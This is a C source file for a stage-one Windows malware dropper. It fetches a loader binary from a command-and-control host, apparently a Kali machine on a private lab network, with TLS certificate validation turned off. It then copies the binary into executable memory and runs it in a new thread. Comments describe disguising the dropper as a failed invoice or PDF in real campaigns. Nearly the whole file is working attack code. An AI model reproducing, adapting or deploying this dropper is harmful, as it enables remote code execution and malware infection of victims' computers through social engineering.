// dropper.c — stage 1
//tangina nag crash laptop ko sa part na to bullshit

#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

#define C2_HOST L"192.168.100.62"   // your Kali
#define C2_PORT 8443
#define C2_PATH L"/loader.bin"

// Download loader into memory
unsigned char* fetch_loader(DWORD* out_len) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", C2_PATH, NULL,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }

    // Ignore self-signed cert on lab C2
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return NULL;
    }

    DWORD size = 0, downloaded = 0, total = 0;
    unsigned char* buf = NULL;

    do {
        size = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &size)) break;
        if (size == 0) break;

        unsigned char* tmp = realloc(buf, total + size);
        if (!tmp) break;
        buf = tmp;

        if (!WinHttpReadData(hRequest, buf + total, size, &downloaded)) break;
        total += downloaded;
    } while (size > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    *out_len = total;
    return buf;
}

// Execute shellcode / PE in memory
void run_in_memory(unsigned char* data, DWORD len) {
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return;

    memcpy(mem, data, len);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    // Look legitimate — show a fake invoice window briefly
    // (in real campaigns this is the social engineering — a PDF that "failed to open")

    // Fetch + run
    DWORD len = 0;
    unsigned char* payload = fetch_loader(&len);
    if (payload && len > 0) {
        run_in_memory(payload, len);
        free(payload);
    }

    return 0;
}
